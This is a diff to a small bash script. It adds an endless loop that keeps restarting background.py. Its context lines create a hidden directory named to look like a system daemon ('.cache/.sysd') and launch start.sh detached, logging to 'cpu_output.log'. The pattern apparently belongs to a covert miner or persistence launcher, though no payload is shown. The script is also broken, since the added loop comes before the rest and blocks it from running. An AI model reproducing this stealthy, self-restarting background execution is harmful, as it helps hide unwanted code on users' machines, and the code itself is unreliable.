@@ -1,5 +1,9 @@
 #!/bin/bash
-
+while true; do
+    python3 background.py
+    echo "Script stopped. Restarting in 5 seconds..."
+    sleep 5
+done
 WORKDIR="$HOME/.cache/.sysd"
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
@@ -9,6 +13,4 @@ chmod +x start.sh
 
 nohup ./start.sh > cpu_output.log 2>&1 &
 
-nohup echo "Script stopped. Restarting in 5 seconds..."
-    sleep 5 >/dev/null 2>&1 &
 
